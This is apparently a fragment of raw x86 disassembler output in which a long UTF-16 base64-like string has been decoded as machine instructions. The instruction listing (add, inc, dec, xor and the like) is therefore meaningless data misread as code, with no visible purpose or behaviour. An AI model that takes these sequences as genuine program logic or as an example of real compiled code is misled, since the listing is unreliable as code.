  40a93c:	2b 00                	sub    (%eax),%eax
  40a93e:	4b                   	dec    %ebx
  40a93f:	00 37                	add    %dh,(%edi)
  40a941:	00 6b 00             	add    %ch,0x0(%ebx)
  40a944:	42                   	inc    %edx
  40a945:	00 71 00             	add    %dh,0x0(%ecx)
  40a948:	64 00 46 00          	add    %al,%fs:0x0(%esi)
  40a94c:	61                   	popa
  40a94d:	00 69 00             	add    %ch,0x0(%ecx)
  40a950:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40a954:	44                   	inc    %esp
  40a955:	00 4f 00             	add    %cl,0x0(%edi)
  40a958:	78 00                	js     0x40a95a
  40a95a:	6e                   	outsb  %ds:(%esi),(%dx)
  40a95b:	00 75 00             	add    %dh,0x0(%ebp)
  40a95e:	2f                   	das
  40a95f:	00 51 00             	add    %dl,0x0(%ecx)
  40a962:	4d                   	dec    %ebp
  40a963:	00 46 00             	add    %al,0x0(%esi)
  40a966:	41                   	inc    %ecx
  40a967:	00 69 00             	add    %ch,0x0(%ecx)
  40a96a:	67 00 56 00          	add    %dl,0x0(%bp)
  40a96e:	53                   	push   %ebx
  40a96f:	00 33                	add    %dh,(%ebx)
  40a971:	00 65 00             	add    %ah,0x0(%ebp)
  40a974:	65 00 4c 00 56       	add    %cl,%gs:0x56(%eax,%eax,1)
  40a979:	00 49 00             	add    %cl,0x0(%ecx)
  40a97c:	67 00 61 00          	add    %ah,0x0(%bx,%di)
  40a980:	46                   	inc    %esi
  40a981:	00 61 00             	add    %ah,0x0(%ecx)
  40a984:	2f                   	das
  40a985:	00 7a 00             	add    %bh,0x0(%edx)
  40a988:	75 00                	jne    0x40a98a
  40a98a:	57                   	push   %edi
  40a98b:	00 67 00             	add    %ah,0x0(%edi)
  40a98e:	6d                   	insl   (%dx),%es:(%edi)
  40a98f:	00 6e 00             	add    %ch,0x0(%esi)
  40a992:	54                   	push   %esp
  40a993:	00 7a 00             	add    %bh,0x0(%edx)
  40a996:	35 00 6a 00 4b       	xor    $0x4b006a00,%eax
  40a99b:	00 6b 00             	add    %ch,0x0(%ebx)
  40a99e:	6d                   	insl   (%dx),%es:(%edi)
  40a99f:	00 2b                	add    %ch,(%ebx)
  40a9a1:	00 52 00             	add    %dl,0x0(%edx)
  40a9a4:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40a9a8:	58                   	pop    %eax
  40a9a9:	00 46 00             	add    %al,0x0(%esi)
  40a9ac:	34 00                	xor    $0x0,%al
  40a9ae:	35 00 76 00 49       	xor    $0x49007600,%eax
  40a9b3:	00 7a 00             	add    %bh,0x0(%edx)
  40a9b6:	53                   	push   %ebx
  40a9b7:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40a9bb:	00 61 00             	add    %ah,0x0(%ecx)
  40a9be:	42                   	inc    %edx
  40a9bf:	00 78 00             	add    %bh,0x0(%eax)
  40a9c2:	62 00                	bound  %eax,(%eax)
  40a9c4:	6d                   	insl   (%dx),%es:(%edi)
  40a9c5:	00 30                	add    %dh,(%eax)
  40a9c7:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40a9cb:	00 4e 00             	add    %cl,0x0(%esi)
  40a9ce:	48                   	dec    %eax
  40a9cf:	00 58 00             	add    %bl,0x0(%eax)
  40a9d2:	48                   	dec    %eax
  40a9d3:	00 58 00             	add    %bl,0x0(%eax)
  40a9d6:	45                   	inc    %ebp
  40a9d7:	00 6d 00             	add    %ch,0x0(%ebp)
  40a9da:	4f                   	dec    %edi
  40a9db:	00 47 00             	add    %al,0x0(%edi)
  40a9de:	63 00                	arpl   %eax,(%eax)
  40a9e0:	53                   	push   %ebx
  40a9e1:	00 66 00             	add    %ah,0x0(%esi)
  40a9e4:	4a                   	dec    %edx
  40a9e5:	00 31                	add    %dh,(%ecx)
  40a9e7:	00 53 00             	add    %dl,0x0(%ebx)
  40a9ea:	68 00 61 00 75       	push   $0x75006100
  40a9ef:	00 4a 00             	add    %cl,0x0(%edx)
  40a9f2:	65 00 64 00 47       	add    %ah,%gs:0x47(%eax,%eax,1)
  40a9f7:	00 44 00 55          	add    %al,0x55(%eax,%eax,1)
  40a9fb:	00 38                	add    %bh,(%eax)
  40a9fd:	00 31                	add    %dh,(%ecx)
  40a9ff:	00 78 00             	add    %bh,0x0(%eax)
  40aa02:	79 00                	jns    0x40aa04
  40aa04:	71 00                	jno    0x40aa06
  40aa06:	7a 00                	jp     0x40aa08
  40aa08:	34 00                	xor    $0x0,%al
  40aa0a:	69 00 35 00 42 00    	imul   $0x420035,(%eax),%eax
  40aa10:	30 00                	xor    %al,(%eax)
  40aa12:	56                   	push   %esi
  40aa13:	00 78 00             	add    %bh,0x0(%eax)
  40aa16:	44                   	inc    %esp
  40aa17:	00 6d 00             	add    %ch,0x0(%ebp)
  40aa1a:	4e                   	dec    %esi
  40aa1b:	00 33                	add    %dh,(%ebx)
  40aa1d:	00 67 00             	add    %ah,0x0(%edi)
  40aa20:	7a 00                	jp     0x40aa22
  40aa22:	6d                   	insl   (%dx),%es:(%edi)
  40aa23:	00 72 00             	add    %dh,0x0(%edx)
  40aa26:	4a                   	dec    %edx
  40aa27:	00 59 00             	add    %bl,0x0(%ecx)
  40aa2a:	42                   	inc    %edx
  40aa2b:	00 75 00             	add    %dh,0x0(%ebp)
  40aa2e:	7a 00                	jp     0x40aa30
  40aa30:	58                   	pop    %eax
  40aa31:	00 66 00             	add    %ah,0x0(%esi)
  40aa34:	4e                   	dec    %esi
  40aa35:	00 51 00             	add    %dl,0x0(%ecx)
  40aa38:	44                   	inc    %esp
  40aa39:	00 4a 00             	add    %cl,0x0(%edx)
  40aa3c:	70 00                	jo     0x40aa3e
  40aa3e:	43                   	inc    %ebx
  40aa3f:	00 69 00             	add    %ch,0x0(%ecx)
  40aa42:	4e                   	dec    %esi
  40aa43:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40aa47:	00 6e 00             	add    %ch,0x0(%esi)
  40aa4a:	54                   	push   %esp
  40aa4b:	00 55 00             	add    %dl,0x0(%ebp)
  40aa4e:	71 00                	jno    0x40aa50
  40aa50:	4f                   	dec    %edi
  40aa51:	00 6a 00             	add    %ch,0x0(%edx)
  40aa54:	4c                   	dec    %esp
  40aa55:	00 6e 00             	add    %ch,0x0(%esi)
  40aa58:	72 00                	jb     0x40aa5a
  40aa5a:	4c                   	dec    %esp
  40aa5b:	00 67 00             	add    %ah,0x0(%edi)
  40aa5e:	6c                   	insb   (%dx),%es:(%edi)
  40aa5f:	00 41 00             	add    %al,0x0(%ecx)
  40aa62:	34 00                	xor    $0x0,%al
  40aa64:	48                   	dec    %eax
  40aa65:	00 39                	add    %bh,(%ecx)
  40aa67:	00 38                	add    %bh,(%eax)
  40aa69:	00 65 00             	add    %ah,0x0(%ebp)
  40aa6c:	6a 00                	push   $0x0
  40aa6e:	51                   	push   %ecx
  40aa6f:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  40aa73:	00 58 00             	add    %bl,0x0(%eax)
  40aa76:	4b                   	dec    %ebx
  40aa77:	00 75 00             	add    %dh,0x0(%ebp)
  40aa7a:	38 00                	cmp    %al,(%eax)
  40aa7c:	51                   	push   %ecx
  40aa7d:	00 7a 00             	add    %bh,0x0(%edx)
  40aa80:	74 00                	je     0x40aa82
  40aa82:	71 00                	jno    0x40aa84
  40aa84:	39 00                	cmp    %eax,(%eax)
  40aa86:	39 00                	cmp    %eax,(%eax)
  40aa88:	33 00                	xor    (%eax),%eax
  40aa8a:	6c                   	insb   (%dx),%es:(%edi)
  40aa8b:	00 47 00             	add    %al,0x0(%edi)
  40aa8e:	4a                   	dec    %edx
  40aa8f:	00 49 00             	add    %cl,0x0(%ecx)
  40aa92:	2f                   	das
  40aa93:	00 78 00             	add    %bh,0x0(%eax)
  40aa96:	48                   	dec    %eax
  40aa97:	00 5a 00             	add    %bl,0x0(%edx)
  40aa9a:	50                   	push   %eax
  40aa9b:	00 47 00             	add    %al,0x0(%edi)
  40aa9e:	46                   	inc    %esi
  40aa9f:	00 6c 00 4c          	add    %ch,0x4c(%eax,%eax,1)
  40aaa3:	00 56 00             	add    %dl,0x0(%esi)
  40aaa6:	6a 00                	push   $0x0
  40aaa8:	4f                   	dec    %edi
  40aaa9:	00 49 00             	add    %cl,0x0(%ecx)
  40aaac:	75 00                	jne    0x40aaae
  40aaae:	41                   	inc    %ecx
  40aaaf:	00 6b 00             	add    %ch,0x0(%ebx)
  40aab2:	6f                   	outsl  %ds:(%esi),(%dx)
  40aab3:	00 61 00             	add    %ah,0x0(%ecx)
  40aab6:	77 00                	ja     0x40aab8
  40aab8:	49                   	dec    %ecx
  40aab9:	00 4b 00             	add    %cl,0x0(%ebx)
  40aabc:	73 00                	jae    0x40aabe
  40aabe:	70 00                	jo     0x40aac0
  40aac0:	54                   	push   %esp
  40aac1:	00 2b                	add    %ch,(%ebx)
  40aac3:	00 68 00             	add    %ch,0x0(%eax)
  40aac6:	75 00                	jne    0x40aac8
  40aac8:	53                   	push   %ebx
  40aac9:	00 51 00             	add    %dl,0x0(%ecx)
  40aacc:	72 00                	jb     0x40aace
  40aace:	42                   	inc    %edx
  40aacf:	00 6c 00 59          	add    %ch,0x59(%eax,%eax,1)
  40aad3:	00 41 00             	add    %al,0x0(%ecx)
  40aad6:	6d                   	insl   (%dx),%es:(%edi)
  40aad7:	00 79 00             	add    %bh,0x0(%ecx)
  40aada:	6c                   	insb   (%dx),%es:(%edi)
  40aadb:	00 59 00             	add    %bl,0x0(%ecx)
  40aade:	50                   	push   %eax
  40aadf:	00 2f                	add    %ch,(%edi)
  40aae1:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
  40aae5:	00 78 00             	add    %bh,0x0(%eax)
  40aae8:	6b 00 41             	imul   $0x41,(%eax),%eax
  40aaeb:	00 33                	add    %dh,(%ebx)
  40aaed:	00 38                	add    %bh,(%eax)
  40aaef:	00 36                	add    %dh,(%esi)
  40aaf1:	00 48 00             	add    %cl,0x0(%eax)
  40aaf4:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40aaf8:	33 00                	xor    (%eax),%eax
  40aafa:	37                   	aaa
  40aafb:	00 76 00             	add    %dh,0x0(%esi)
  40aafe:	48                   	dec    %eax
  40aaff:	00 2b                	add    %ch,(%ebx)
  40ab01:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab04:	50                   	push   %eax
  40ab05:	00 2f                	add    %ch,(%edi)
  40ab07:	00 73 00             	add    %dh,0x0(%ebx)
  40ab0a:	78 00                	js     0x40ab0c
  40ab0c:	49                   	dec    %ecx
  40ab0d:	00 55 00             	add    %dl,0x0(%ebp)
  40ab10:	57                   	push   %edi
  40ab11:	00 55 00             	add    %dl,0x0(%ebp)
  40ab14:	47                   	inc    %edi
  40ab15:	00 71 00             	add    %dh,0x0(%ecx)
  40ab18:	35 00 6d 00 58       	xor    $0x58006d00,%eax
  40ab1d:	00 4d 00             	add    %cl,0x0(%ebp)
  40ab20:	67 00 75 00          	add    %dh,0x0(%di)
  40ab24:	56                   	push   %esi
  40ab25:	00 4f 00             	add    %cl,0x0(%edi)
  40ab28:	66 00 75 00          	data16 add %dh,0x0(%ebp)
  40ab2c:	77 00                	ja     0x40ab2e
  40ab2e:	4f                   	dec    %edi
  40ab2f:	00 66 00             	add    %ah,0x0(%esi)
  40ab32:	36 00 68 00          	add    %ch,%ss:0x0(%eax)
  40ab36:	71 00                	jno    0x40ab38
  40ab38:	33 00                	xor    (%eax),%eax
  40ab3a:	38 00                	cmp    %al,(%eax)
  40ab3c:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab3d:	00 44 00 71          	add    %al,0x71(%eax,%eax,1)
  40ab41:	00 56 00             	add    %dl,0x0(%esi)
  40ab44:	70 00                	jo     0x40ab46
  40ab46:	42                   	inc    %edx
  40ab47:	00 41 00             	add    %al,0x0(%ecx)
  40ab4a:	55                   	push   %ebp
  40ab4b:	00 6a 00             	add    %ch,0x0(%edx)
  40ab4e:	43                   	inc    %ebx
  40ab4f:	00 73 00             	add    %dh,0x0(%ebx)
  40ab52:	78 00                	js     0x40ab54
  40ab54:	7a 00                	jp     0x40ab56
  40ab56:	30 00                	xor    %al,(%eax)
  40ab58:	71 00                	jno    0x40ab5a
  40ab5a:	5a                   	pop    %edx
  40ab5b:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40ab5f:	00 4a 00             	add    %cl,0x0(%edx)
  40ab62:	6e                   	outsb  %ds:(%esi),(%dx)
  40ab63:	00 65 00             	add    %ah,0x0(%ebp)
  40ab66:	56                   	push   %esi
  40ab67:	00 33                	add    %dh,(%ebx)
  40ab69:	00 31                	add    %dh,(%ecx)
  40ab6b:	00 7a 00             	add    %bh,0x0(%edx)
  40ab6e:	4a                   	dec    %edx
  40ab6f:	00 48 00             	add    %cl,0x0(%eax)
  40ab72:	4c                   	dec    %esp
  40ab73:	00 51 00             	add    %dl,0x0(%ecx)
  40ab76:	4e                   	dec    %esi
  40ab77:	00 39                	add    %bh,(%ecx)
  40ab79:	00 7a 00             	add    %bh,0x0(%edx)
  40ab7c:	50                   	push   %eax
  40ab7d:	00 44 00 6b          	add    %al,0x6b(%eax,%eax,1)
  40ab81:	00 78 00             	add    %bh,0x0(%eax)
  40ab84:	6d                   	insl   (%dx),%es:(%edi)
  40ab85:	00 73 00             	add    %dh,0x0(%ebx)
  40ab88:	79 00                	jns    0x40ab8a
  40ab8a:	53                   	push   %ebx
  40ab8b:	00 56 00             	add    %dl,0x0(%esi)
  40ab8e:	39 00                	cmp    %eax,(%eax)
  40ab90:	6b 00 4b             	imul   $0x4b,(%eax),%eax
  40ab93:	00 55 00             	add    %dl,0x0(%ebp)
  40ab96:	34 00                	xor    $0x0,%al
  40ab98:	47                   	inc    %edi
  40ab99:	00 49 00             	add    %cl,0x0(%ecx)
  40ab9c:	44                   	inc    %esp
  40ab9d:	00 62 00             	add    %ah,0x0(%edx)
  40aba0:	54                   	push   %esp
  40aba1:	00 73 00             	add    %dh,0x0(%ebx)
  40aba4:	61                   	popa
  40aba5:	00 31                	add    %dh,(%ecx)
  40aba7:	00 76 00             	add    %dh,0x0(%esi)
  40abaa:	33 00                	xor    (%eax),%eax
  40abac:	6b 00 38             	imul   $0x38,(%eax),%eax
  40abaf:	00 7a 00             	add    %bh,0x0(%edx)
  40abb2:	46                   	inc    %esi
  40abb3:	00 54 00 47          	add    %dl,0x47(%eax,%eax,1)
  40abb7:	00 4f 00             	add    %cl,0x0(%edi)
  40abba:	4b                   	dec    %ebx
  40abbb:	00 61 00             	add    %ah,0x0(%ecx)
  40abbe:	4a                   	dec    %edx
  40abbf:	00 56 00             	add    %dl,0x0(%esi)
  40abc2:	2b 00                	sub    (%eax),%eax
  40abc4:	52                   	push   %edx
  40abc5:	00 2f                	add    %ch,(%edi)
  40abc7:	00 4d 00             	add    %cl,0x0(%ebp)
  40abca:	6d                   	insl   (%dx),%es:(%edi)
  40abcb:	00 71 00             	add    %dh,0x0(%ecx)
  40abce:	66 00 63 00          	data16 add %ah,0x0(%ebx)
  40abd2:	77 00                	ja     0x40abd4
  40abd4:	42                   	inc    %edx
  40abd5:	00 61 00             	add    %ah,0x0(%ecx)
  40abd8:	31 00                	xor    %eax,(%eax)
  40abda:	35 00 7a 00 66       	xor    $0x66007a00,%eax
  40abdf:	00 4e 00             	add    %cl,0x0(%esi)
  40abe2:	34 00                	xor    $0x0,%al
  40abe4:	67 00 74 00          	add    %dh,0x0(%si)
  40abe8:	58                   	pop    %eax
  40abe9:	00 6e 00             	add    %ch,0x0(%esi)
  40abec:	33 00                	xor    (%eax),%eax
  40abee:	2f                   	das
  40abef:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
  40abf3:	00 4f 00             	add    %cl,0x0(%edi)
  40abf6:	65 00 38             	add    %bh,%gs:(%eax)
  40abf9:	00 4e 00             	add    %cl,0x0(%esi)
  40abfc:	51                   	push   %ecx
  40abfd:	00 57 00             	add    %dl,0x0(%edi)
  40ac00:	36 00 4d 00          	add    %cl,%ss:0x0(%ebp)
  40ac04:	41                   	inc    %ecx
  40ac05:	00 58 00             	add    %bl,0x0(%eax)
  40ac08:	45                   	inc    %ebp
  40ac09:	00 65 00             	add    %ah,0x0(%ebp)
  40ac0c:	32 00                	xor    (%eax),%al
  40ac0e:	37                   	aaa
  40ac0f:	00 68 00             	add    %ch,0x0(%eax)
  40ac12:	31 00                	xor    %eax,(%eax)
  40ac14:	55                   	push   %ebp
  40ac15:	00 63 00             	add    %ah,0x0(%ebx)
  40ac18:	45                   	inc    %ebp
  40ac19:	00 75 00             	add    %dh,0x0(%ebp)
  40ac1c:	38 00                	cmp    %al,(%eax)
  40ac1e:	37                   	aaa
  40ac1f:	00 77 00             	add    %dh,0x0(%edi)
  40ac22:	78 00                	js     0x40ac24
  40ac24:	75 00                	jne    0x40ac26
  40ac26:	45                   	inc    %ebp
  40ac27:	00 79 00             	add    %bh,0x0(%ecx)
  40ac2a:	72 00                	jb     0x40ac2c
  40ac2c:	42                   	inc    %edx
  40ac2d:	00 41 00             	add    %al,0x0(%ecx)
  40ac30:	4d                   	dec    %ebp
  40ac31:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac34:	68 00 4e 00 6d       	push   $0x6d004e00
  40ac39:	00 71 00             	add    %dh,0x0(%ecx)
  40ac3c:	62 00                	bound  %eax,(%eax)
  40ac3e:	71 00                	jno    0x40ac40
  40ac40:	77 00                	ja     0x40ac42
  40ac42:	53                   	push   %ebx
  40ac43:	00 30                	add    %dh,(%eax)
  40ac45:	00 6f 00             	add    %ch,0x0(%edi)
  40ac48:	50                   	push   %eax
  40ac49:	00 51 00             	add    %dl,0x0(%ecx)
  40ac4c:	2f                   	das
  40ac4d:	00 2b                	add    %ch,(%ebx)
  40ac4f:	00 7a 00             	add    %bh,0x0(%edx)
  40ac52:	53                   	push   %ebx
  40ac53:	00 4b 00             	add    %cl,0x0(%ebx)
  40ac56:	6c                   	insb   (%dx),%es:(%edi)
  40ac57:	00 63 00             	add    %ah,0x0(%ebx)
  40ac5a:	46                   	inc    %esi
  40ac5b:	00 6f 00             	add    %ch,0x0(%edi)
  40ac5e:	30 00                	xor    %al,(%eax)
  40ac60:	6d                   	insl   (%dx),%es:(%edi)
  40ac61:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac64:	45                   	inc    %ebp
  40ac65:	00 57 00             	add    %dl,0x0(%edi)
  40ac68:	55                   	push   %ebp
  40ac69:	00 74 00 6a          	add    %dh,0x6a(%eax,%eax,1)
  40ac6d:	00 72 00             	add    %dh,0x0(%edx)
  40ac70:	67 00 38             	add    %bh,(%bx,%si)
  40ac73:	00 43 00             	add    %al,0x0(%ebx)
  40ac76:	2f                   	das
  40ac77:	00 41 00             	add    %al,0x0(%ecx)
  40ac7a:	4a                   	dec    %edx
  40ac7b:	00 39                	add    %bh,(%ecx)
  40ac7d:	00 70 00             	add    %dh,0x0(%eax)
  40ac80:	4c                   	dec    %esp
  40ac81:	00 46 00             	add    %al,0x0(%esi)
  40ac84:	68 00 66 00 7a       	push   $0x7a006600
  40ac89:	00 58 00             	add    %bl,0x0(%eax)
  40ac8c:	51                   	push   %ecx
  40ac8d:	00 4c 00 70          	add    %cl,0x70(%eax,%eax,1)
  40ac91:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40ac95:	00 32                	add    %dh,(%edx)
  40ac97:	00 6e 00             	add    %ch,0x0(%esi)
  40ac9a:	5a                   	pop    %edx
  40ac9b:	00 2f                	add    %ch,(%edi)
  40ac9d:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  40aca1:	00 62 00             	add    %ah,0x0(%edx)
  40aca4:	69 00 43 00 63 00    	imul   $0x630043,(%eax),%eax
  40acaa:	36 00 32             	add    %dh,%ss:(%edx)
  40acad:	00 46 00             	add    %al,0x0(%esi)
  40acb0:	32 00                	xor    (%eax),%al
  40acb2:	44                   	inc    %esp
  40acb3:	00 52 00             	add    %dl,0x0(%edx)
  40acb6:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40acba:	5a                   	pop    %edx
  40acbb:	00 37                	add    %dh,(%edi)
  40acbd:	00 5a 00             	add    %bl,0x0(%edx)
  40acc0:	48                   	dec    %eax
  40acc1:	00 38                	add    %bh,(%eax)
  40acc3:	00 6d 00             	add    %ch,0x0(%ebp)
  40acc6:	69 00 72 00 57 00    	imul   $0x570072,(%eax),%eax
  40accc:	58                   	pop    %eax
  40accd:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
  40acd1:	00 53 00             	add    %dl,0x0(%ebx)
  40acd4:	39 00                	cmp    %eax,(%eax)
  40acd6:	6c                   	insb   (%dx),%es:(%edi)
  40acd7:	00 43 00             	add    %al,0x0(%ebx)
  40acda:	7a 00                	jp     0x40acdc
  40acdc:	76 00                	jbe    0x40acde
  40acde:	5a                   	pop    %edx
  40acdf:	00 6b 00             	add    %ch,0x0(%ebx)
  40ace2:	59                   	pop    %ecx
  40ace3:	00 31                	add    %dh,(%ecx)
  40ace5:	00 52 00             	add    %dl,0x0(%edx)
  40ace8:	6c                   	insb   (%dx),%es:(%edi)
  40ace9:	00 78 00             	add    %bh,0x0(%eax)
  40acec:	34 00                	xor    $0x0,%al
  40acee:	46                   	inc    %esi
  40acef:	00 35 00 38 00 76    	add    %dh,0x76003800
  40acf5:	00 6a 00             	add    %ch,0x0(%edx)
  40acf8:	79 00                	jns    0x40acfa
  40acfa:	63 00                	arpl   %eax,(%eax)
  40acfc:	41                   	inc    %ecx
  40acfd:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad00:	69 00 37 00 33 00    	imul   $0x330037,(%eax),%eax
  40ad06:	56                   	push   %esi
  40ad07:	00 41 00             	add    %al,0x0(%ecx)
  40ad0a:	4a                   	dec    %edx
  40ad0b:	00 59 00             	add    %bl,0x0(%ecx)
  40ad0e:	4f                   	dec    %edi
  40ad0f:	00 56 00             	add    %dl,0x0(%esi)
  40ad12:	7a 00                	jp     0x40ad14
  40ad14:	42                   	inc    %edx
  40ad15:	00 57 00             	add    %dl,0x0(%edi)
  40ad18:	37                   	aaa
  40ad19:	00 61 00             	add    %ah,0x0(%ecx)
  40ad1c:	72 00                	jb     0x40ad1e
  40ad1e:	52                   	push   %edx
  40ad1f:	00 47 00             	add    %al,0x0(%edi)
  40ad22:	78 00                	js     0x40ad24
  40ad24:	61                   	popa
  40ad25:	00 4f 00             	add    %cl,0x0(%edi)
  40ad28:	71 00                	jno    0x40ad2a
  40ad2a:	6c                   	insb   (%dx),%es:(%edi)
  40ad2b:	00 41 00             	add    %al,0x0(%ecx)
  40ad2e:	75 00                	jne    0x40ad30
  40ad30:	4b                   	dec    %ebx
  40ad31:	00 71 00             	add    %dh,0x0(%ecx)
  40ad34:	74 00                	je     0x40ad36
  40ad36:	54                   	push   %esp
  40ad37:	00 68 00             	add    %ch,0x0(%eax)
  40ad3a:	7a 00                	jp     0x40ad3c
  40ad3c:	37                   	aaa
  40ad3d:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40ad41:	00 4e 00             	add    %cl,0x0(%esi)
  40ad44:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  40ad48:	70 00                	jo     0x40ad4a
  40ad4a:	38 00                	cmp    %al,(%eax)
  40ad4c:	6a 00                	push   $0x0
  40ad4e:	30 00                	xor    %al,(%eax)
  40ad50:	55                   	push   %ebp
  40ad51:	00 4f 00             	add    %cl,0x0(%edi)
  40ad54:	43                   	inc    %ebx
  40ad55:	00 42 00             	add    %al,0x0(%edx)
  40ad58:	5a                   	pop    %edx
  40ad59:	00 4e 00             	add    %cl,0x0(%esi)
  40ad5c:	51                   	push   %ecx
  40ad5d:	00 72 00             	add    %dh,0x0(%edx)
  40ad60:	4f                   	dec    %edi
  40ad61:	00 4e 00             	add    %cl,0x0(%esi)
  40ad64:	4e                   	dec    %esi
  40ad65:	00 35 00 54 00 78    	add    %dh,0x78005400
  40ad6b:	00 72 00             	add    %dh,0x0(%edx)
  40ad6e:	34 00                	xor    $0x0,%al
  40ad70:	6e                   	outsb  %ds:(%esi),(%dx)
  40ad71:	00 78 00             	add    %bh,0x0(%eax)
  40ad74:	69 00 49 00 69 00    	imul   $0x690049,(%eax),%eax
  40ad7a:	37                   	aaa
  40ad7b:	00 6f 00             	add    %ch,0x0(%edi)
  40ad7e:	75 00                	jne    0x40ad80
  40ad80:	2f                   	das
  40ad81:	00 4f 00             	add    %cl,0x0(%edi)
  40ad84:	30 00                	xor    %al,(%eax)
  40ad86:	6a 00                	push   $0x0
  40ad88:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40ad8c:	44                   	inc    %esp
  40ad8d:	00 50 00             	add    %dl,0x0(%eax)
  40ad90:	52                   	push   %edx
  40ad91:	00 41 00             	add    %al,0x0(%ecx)
  40ad94:	55                   	push   %ebp
  40ad95:	00 59 00             	add    %bl,0x0(%ecx)
  40ad98:	5a                   	pop    %edx
  40ad99:	00 53 00             	add    %dl,0x0(%ebx)
  40ad9c:	6c                   	insb   (%dx),%es:(%edi)
  40ad9d:	00 6f 00             	add    %ch,0x0(%edi)
  40ada0:	6c                   	insb   (%dx),%es:(%edi)
  40ada1:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40ada5:	00 45 00             	add    %al,0x0(%ebp)
  40ada8:	43                   	inc    %ebx
  40ada9:	00 67 00             	add    %ah,0x0(%edi)
  40adac:	61                   	popa
  40adad:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40adb1:	00 38                	add    %bh,(%eax)
  40adb3:	00 68 00             	add    %ch,0x0(%eax)
  40adb6:	45                   	inc    %ebp
  40adb7:	00 41 00             	add    %al,0x0(%ecx)
  40adba:	43                   	inc    %ebx
  40adbb:	00 4d 00             	add    %cl,0x0(%ebp)
  40adbe:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40adc2:	45                   	inc    %ebp
  40adc3:	00 58 00             	add    %bl,0x0(%eax)
  40adc6:	2f                   	das
  40adc7:	00 31                	add    %dh,(%ecx)
  40adc9:	00 71 00             	add    %dh,0x0(%ecx)
  40adcc:	78 00                	js     0x40adce
  40adce:	72 00                	jb     0x40add0
  40add0:	76 00                	jbe    0x40add2
  40add2:	69 00 36 00 75 00    	imul   $0x750036,(%eax),%eax
  40add8:	77 00                	ja     0x40adda
  40adda:	48                   	dec    %eax
  40addb:	00 59 00             	add    %bl,0x0(%ecx)
  40adde:	55                   	push   %ebp
  40addf:	00 62 00             	add    %ah,0x0(%edx)
  40ade2:	75 00                	jne    0x40ade4
  40ade4:	75 00                	jne    0x40ade6
  40ade6:	37                   	aaa
  40ade7:	00 49 00             	add    %cl,0x0(%ecx)
  40adea:	4e                   	dec    %esi
  40adeb:	00 49 00             	add    %cl,0x0(%ecx)
  40adee:	46                   	inc    %esi
  40adef:	00 54 00 46          	add    %dl,0x46(%eax,%eax,1)
  40adf3:	00 65 00             	add    %ah,0x0(%ebp)
  40adf6:	71 00                	jno    0x40adf8
  40adf8:	52                   	push   %edx
  40adf9:	00 61 00             	add    %ah,0x0(%ecx)
  40adfc:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40ae00:	33 00                	xor    (%eax),%eax
  40ae02:	44                   	inc    %esp
  40ae03:	00 77 00             	add    %dh,0x0(%edi)
  40ae06:	65 00 31             	add    %dh,%gs:(%ecx)
  40ae09:	00 35 00 63 00 62    	add    %dh,0x62006300
  40ae0f:	00 62 00             	add    %ah,0x0(%edx)
  40ae12:	44                   	inc    %esp
  40ae13:	00 50 00             	add    %dl,0x0(%eax)
  40ae16:	71 00                	jno    0x40ae18
  40ae18:	55                   	push   %ebp
  40ae19:	00 65 00             	add    %ah,0x0(%ebp)
  40ae1c:	78 00                	js     0x40ae1e
  40ae1e:	2f                   	das
  40ae1f:	00 5a 00             	add    %bl,0x0(%edx)
  40ae22:	48                   	dec    %eax
  40ae23:	00 55 00             	add    %dl,0x0(%ebp)
  40ae26:	32 00                	xor    (%eax),%al
  40ae28:	44                   	inc    %esp
  40ae29:	00 4a 00             	add    %cl,0x0(%edx)
  40ae2c:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  40ae30:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40ae34:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  40ae38:	42                   	inc    %edx
  40ae39:	00 68 00             	add    %ch,0x0(%eax)
  40ae3c:	33 00                	xor    (%eax),%eax
  40ae3e:	54                   	push   %esp
  40ae3f:	00 71 00             	add    %dh,0x0(%ecx)
  40ae42:	47                   	inc    %edi
  40ae43:	00 66 00             	add    %ah,0x0(%esi)
  40ae46:	2b 00                	sub    (%eax),%eax
  40ae48:	50                   	push   %eax
  40ae49:	00 77 00             	add    %dh,0x0(%edi)
  40ae4c:	30 00                	xor    %al,(%eax)
  40ae4e:	67 00 4f 00          	add    %cl,0x0(%bx)
  40ae52:	61                   	popa
  40ae53:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  40ae57:	00 30                	add    %dh,(%eax)
  40ae59:	00 42 00             	add    %al,0x0(%edx)
  40ae5c:	6d                   	insl   (%dx),%es:(%edi)
  40ae5d:	00 55 00             	add    %dl,0x0(%ebp)
  40ae60:	6f                   	outsl  %ds:(%esi),(%dx)
  40ae61:	00 33                	add    %dh,(%ebx)
  40ae63:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae66:	55                   	push   %ebp
  40ae67:	00 43 00             	add    %al,0x0(%ebx)
  40ae6a:	51                   	push   %ecx
  40ae6b:	00 42 00             	add    %al,0x0(%edx)
  40ae6e:	51                   	push   %ecx
